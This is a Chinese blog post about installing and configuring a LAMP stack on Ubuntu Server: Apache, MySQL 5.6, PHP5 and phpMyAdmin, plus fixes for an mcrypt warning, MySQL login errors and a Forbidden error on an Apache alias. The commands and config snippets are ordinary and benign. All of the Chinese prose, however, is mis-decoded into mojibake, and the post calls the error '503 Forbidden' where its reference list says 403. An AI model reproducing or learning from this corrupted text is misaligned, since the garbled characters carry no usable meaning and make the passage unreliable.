vsftpdï¼Œä¸å¤šè¯´ï¼Œæƒ³è¯¦ç»†äº†è§£çš„å¯ä»¥å»çœ‹æŸLinuxè™šæ‹Ÿæœºå®‰è£…åŠé…ç½®æŒ‡å—ï¼ˆä»£å·PA0ï¼‰ã€‚ä¸Šå­¦æœŸè£…Linuxè£…äº†ç»ä¸ä¸‹10éï¼Œå†è¯´ä¸‹å»è‡ªå·±éƒ½è¦åäº†ã€‚ä¸è¿‡å€¼å¾—ä¸€æçš„æ˜¯ï¼ŒUbuntu Serverå®‰è£…ç¨‹åºçš„ç”¨æˆ·ä½“éªŒç®€ç›´æ£’ï¼Œå®‰è£…è¿‡ç¨‹ä¸­æœ‰ä¸€æ­¥æ˜¯è®¾ç½®é”®ç›˜å¸ƒå±€ï¼Œä»¥å‰éƒ½è¦è‡ªå·±å»ä¸€ä¸ªé•¿é•¿çš„åˆ—è¡¨é‡Œç¿»è‡ªå·±çš„é”®ç›˜å¸ƒå±€ï¼ˆé€šå¸¸æ˜¯USï¼‰ï¼Œè€ŒUbuntu Serveræä¾›äº†ä¸€ä¸ªå°è„šæœ¬æ¥è¿›è¡Œè‡ªåŠ¨æ£€æµ‹ï¼šä¾ç…§æç¤ºæ•²å‡ ä¸ªå­—æ¯/ç¬¦å·ï¼Œå†å›ç­”ä¸€ä¸ªé—®é¢˜ï¼Œå®‰è£…ç¨‹åºä¼šè‡ªåŠ¨æ£€æµ‹å‡ºé€‚åˆä½ çš„é”®ç›˜å¸ƒå±€ã€‚Apacheè¾“å…¥apt-get install apache2å‘½ä»¤å®‰è£…apache.å®‰è£…è¿‡ç¨‹ä¸­apacheæœåŠ¡å·²ç»å¯åŠ¨ï¼Œå¦‚æœæœªå¯åŠ¨ï¼Œåˆ™è¾“å…¥service apache2 startå¯åŠ¨apacheæœåŠ¡ã€‚å¯åŠ¨åè®¿é—®æœåŠ¡å™¨ipï¼Œä¼šå‡ºç°apacheçš„æµ‹è¯•é¡µé¢ã€‚MySQLè¾“å…¥apt-get install mysql-server-5.6 mysql-client-5.6è¿›è¡Œå®‰è£…ã€‚å®‰è£…è¿‡ç¨‹ä¸­éœ€è¦è¾“å…¥MySQL rootå¯†ç ã€‚PHPè¾“å…¥apt-get install php5 libapache2-mod-php5å®‰è£…php, å®‰è£…è¿‡åéœ€è¦è¾“å…¥service apache2 restarté‡å¯apacheæœåŠ¡ã€‚ 3.2 é…ç½®å®‰è£…phpMyAdminè¾“å…¥apt-get install phpmyadminè¿›è¡Œå®‰è£…ï¼Œå®‰è£…çš„æ—¶å€™ä¼šæç¤ºè¾“å…¥mysqlçš„rootå¯†ç ï¼Œå¹¶ä¸”æç¤ºæ–°å»ºä¸€ä¸ªæ•°æ®åº“ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥æŒ‰éœ€æ±‚ä¸æ–°å»ºã€‚å®‰è£…å¥½ä»¥åè®¿é—®http://localhost/phpmyadmin/index.php ï¼Œç™»å½•ä¹‹åé¡µé¢ä¸‹æ–¹ä¼šæœ‰è­¦å‘Šâ€œç¼ºå°‘ mcrypt æ‰©å±•ã€‚è¯·æ£€æŸ¥ PHP é…ç½®ã€‚â€æ­¤æ—¶æŒ‰ç…§æŒ‡å—çš„æ–¹æ³•åšæ²¡æœ‰æ•ˆæœï¼Œç»ç™¾åº¦+Googleåæ‰¾åˆ°äº†è§£å†³æ–¹æ¡ˆï¼šå®‰è£…php5-mcryptåï¼Œæ›´æ”¹php.iniåé—®é¢˜æœªè§£å†³ï¼Œæ ¹æ®å®˜æ–¹çš„mcryptå®‰è£…æŒ‡å—ï¼Œè¾“å…¥php5enmod mcryptåï¼Œé—®é¢˜è§£å†³ã€‚MySQLå‘½ä»¤è¡Œæ— æ³•å¯åŠ¨æ³¨ï¼šè¿™æ®µæ˜¯è‡ªå·±çæŠ˜è…¾çš„ï¼Œå•¥éƒ½æ²¡çœ‹å°±ä¹±ç©é‡åˆ°çš„é—®é¢˜ã€‚è¾“å…¥mysqlåé‡åˆ°é—®é¢˜ï¼š12âœ ~ mysqlERROR 1045 (28000): Access denied for user &apos;stdio&apos;@&apos;localhost&apos; (using password: NO)å°è¯•ç”¨rootæƒé™è¿è¡Œï¼Œå¾—åˆ°åŒæ ·çš„ç»“æœã€‚12âœ ~ sudo mysqlERROR 1045 (28000): Access denied for user &apos;root&apos;@&apos;localhost&apos; (using password: NO)ä¸€ç•ªç™¾åº¦+google+SegmentFaultåï¼Œæ‰¾åˆ°æ­£ç¡®è¿›å…¥å‘½ä»¤è¡Œçš„å§¿åŠ¿ï¼š123456789101112131415âœ ~ sudo mysql -u root -pEnter password:Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 55Server version: 5.6.19-0ubuntu0.14.04.1 (Ubuntu)Copyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.mysql&gt;è®¾ç½®Apacheè™šæ‹Ÿç›®å½•æŠŠæ‰€æœ‰æ–‡ä»¶å…¨éƒ¨æ”¾åœ¨/var/wwwä¸‹çœŸçš„å¥½éº»çƒ¦ï¼Œä½•å†µæ™®é€šè´¦æˆ·æ²¡æœ‰/var/wwwçš„å†™æƒé™ï¼Œæ‰€ä»¥è®¾ç½®ä¸€ä¸ªaliasï¼Œå°†æŸä¸ªApacheè™šæ‹Ÿç›®å½•æ˜ å°„åˆ°homeç›®å½•ä¸‹ï¼Œä»¥åæ“ä½œèµ·æ¥å°±ä¼šæ–¹ä¾¿å¾ˆå¤šã€‚ä¿®æ”¹/etc/apache2/mods-enabled/alias.confæ–‡ä»¶ï¼Œæ·»åŠ å¦‚ä¸‹è¡Œï¼Œç„¶åé‡å¯ApacheæœåŠ¡ï¼š12345678Alias /web &quot;/home/stdio/websites/&quot;&lt;Directory &quot;/home/stdio/websites/&quot;&gt; Options None AllowOverride None Order allow,deny Allow from all&lt;/Directory&gt;ç„¶è€Œåœ¨æˆ‘è®¿é—®http://localhost/webæ—¶ï¼Œå´å¾—åˆ°äº†503 Forbiddençš„çŠ¶æ€ç ï¼Œå„ç§ä¹±è®¿é—®æ— æœï¼Œäºæ˜¯åœ¨ç½‘ä¸Šä¹±æœè§£å†³æ–¹æ¡ˆï¼Œæœ‰è®©æ”¹httpdçš„ï¼ˆhttpdè·ŸApacheæœ‰å•¥å…³ç³»ï¼‰ï¼Œæœ‰æ”¹aliasé…ç½®çš„ï¼ˆæˆ‘çš„aliasé…ç½®çš„æ²¡æœ‰é—®é¢˜å•Šï¼‰ï¼Œæœ€åçœ‹åˆ°äº†ä¸€ä¸ªæ–¹æ¡ˆï¼ŒæŸ¥çœ‹apache2.confçš„ç›®å½•æƒé™é…ç½®ã€‚ä¿®æ”¹/etc/apache2/apache2.confæ–‡ä»¶ï¼Œå‘ç°ä»¥ä¸‹è®¾ç½®ï¼š12345678910111213141516&lt;Directory /&gt; Options FollowSymLinks AllowOverride None Require all denied&lt;/Directory&gt;&lt;Directory /usr/share&gt; AllowOverride None Require all granted&lt;/Directory&gt;&lt;Directory /var/www/&gt; Options Indexes FollowSymLinks AllowOverride None Require all granted&lt;/Directory&gt;å› ä¸ºApacheçš„é»˜è®¤é…ç½®æ˜¯ä¸èƒ½è®¿é—®/çš„ï¼Œæ‰€ä»¥æˆ‘æ²¡æœ‰å¯¹~/websitesçš„è®¿é—®æƒé™ï¼ˆè¿™é‡Œé€»è¾‘å¥½æ··ä¹±ï¼‰ã€‚æ·»åŠ é…ç½®ï¼š12345&lt;Directory /home/stdio/websites&gt; Options FollowSymLinks AllowOverride None Require all granted&lt;/Directory&gt;é‡å¯ApacheæœåŠ¡ï¼Œhttp://localhost/webç›®å½•ä¸‹çš„æ–‡ä»¶å‡å¯æ­£å¸¸è®¿é—®ã€‚ 4. ä¹±æå»å¹´å¼€å­¦çš„æ—¶å€™ç”¨phpå†™è¿‡ä¸€ä¸ªå°çš„æ–‡ä»¶æµè§ˆå™¨ï¼ˆå°±åƒApacheè‡ªå¸¦çš„æ–‡ä»¶æœåŠ¡å™¨é‚£æ ·çš„ï¼‰ï¼Œé—²å¾—æ— èŠæƒ³æŠŠå®ƒéƒ¨ç½²åˆ°è‡ªå·±åˆšæ­å¥½çš„æœåŠ¡å™¨ä¸Šï¼Œçœ‹çœ‹èƒ½ä¸èƒ½æ­£å¸¸è¿è¡Œï¼Œäºæ˜¯å°±æŠŠæ–‡ä»¶ä¼ åˆ°æœåŠ¡å™¨ä¸Šè®¿é—®ï¼Œä¸å‡ºæ„å¤–ï¼Œå¤±è´¥äº†ã€‚ç„¶åå°±æ‰¾å‘€æ‰¾å‘€æ‰¾bugï¼Œæ‰¾åˆ°ä¸€ä¸ªå°bugï¼ˆè¯·è‡ªåŠ¨è„‘è¡¥èƒŒæ™¯éŸ³ä¹ï¼‰ï¼Œæ‰¾äº†åŠä¸ªç‚¹æœ€åå‘ç°ï¼Œåœ¨ä»é…ç½®æ–‡æ¡£è¯»å–æ ¹ç›®å½•è·¯å¾„çš„æ—¶å€™ï¼Œä¼šåœ¨ç›®å½•ç»“å°¾åŠ ä¸€ä¸ªç©ºæ ¼ï¼ˆç°åœ¨æƒ³èµ·æ¥è§‰å¾—åº”è¯¥æ˜¯^Mï¼‰å¯¼è‡´è·¯å¾„æ‹¼æ¥æ—¶å‡ºé”™ï¼Œäºæ˜¯åœ¨$rootpathå‰é¢åŠ äº†trimï¼Œç„¶åå°±å¥½äº†â€¦æˆ‘çœŸæ˜¯èƒ½ä½œ_(:Ğ·ã‚âˆ )_ 5. æ€»ç»“è‡ªå·±åŠ¨æ‰‹æ­å»ºLAMPç¯å¢ƒè¿˜æ˜¯ä¸€ä»¶æŒºæœ‰æ„æ€çš„äº‹æƒ…ï¼Œé‡åˆ°é—®é¢˜è‡ªå·±å»æ‰¾ç­”æ¡ˆè‡ªå·±è§£å†³ï¼Œæœ€åæ‰€æœ‰çš„æœåŠ¡å…¨éƒ½æ­£å¸¸è¿è¡Œæ—¶è¿˜æ˜¯æœ‰ä¸€ç‚¹ç‚¹æˆå°±æ„Ÿçš„~åŠå¹´æ²¡ç¢°PHPï¼Œä¸€å…±å°±å†™äº†ä¸åˆ°10è¡Œä»£ç ï¼Œè¿˜å†™é”™äº†ä¸€åŠï¼Œæ¯”å¦‚æŠŠphpinfo()å†™æˆphp_infoï¼Œå¿˜äº†åœ¨&lt;?åé¢åŠ phpç¥é©¬çš„â€¦ï¼ˆæˆ‘è®°å¾—ä»¥å‰è°è·Ÿæˆ‘è¯´&lt;?åé¢å¯ä»¥ä¸åŠ phpçš„å•Šï¼‰ä¸€ç¯‡æ–‡ç« å†™äº†ä¸€æ™šä¸Šã€‚å¥½ä¹…æ²¡å†™è¿‡åšæ–‡äº†ï¼Œå†™è¿™ç¯‡æ–‡ç« ä¸»è¦æ˜¯æŠŠè‡ªå·±çš„ç»éªŒè®°ä¸‹æ¥ï¼Œå¦‚æœè¿™ç¯‡æ–‡ç« å¯ä»¥å¸®åˆ°è°çš„è¯ï¼Œé‚£å½“ç„¶æ›´å¥½~LinuxæŒºå¥½ç©çš„ï¼Œæ¯”è½¯ä»¶æµ‹è¯•å¥½ç©å¤šäº†ï¼ï¼ˆæœç„¶åˆ°äº†æœ€åè¿˜æ˜¯è¦é»‘ä¸€æŠŠæµ‹è¯•ï¼‰ 6. å‚è€ƒæ–‡æ¡£ubuntuä¸‹æ­å»ºLAMPPHP Mcrypt Installing/ConfiguringapacheæœåŠ¡å‡ºç°Forbidden 403é—®é¢˜çš„è§£å†³æ–¹æ³•æ€»ç»“ERROR 1045 (28000): Access denied for user â€˜rootâ€™@â€˜localhostâ€™ (using password: NO)","categories":[{"name":"ç½‘ç»œ","slug":"ç½‘ç»œ","permalink":"https://blog.stdioa.com/categories/ç½‘ç»œ/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://blog.stdioa.com/tags/Linux/"},{"name":"Apache","slug":"Apache","permalink":"https://blog.stdioa.com/tags/Apache/"},{"name":"MySQL","slug":"MySQL","permalink":"https://blog.stdioa.com/tags/MySQL/"},{"name":"PHP","slug":"PHP","permalink":"https://blog.stdioa.com/tags/PHP/"}]}]}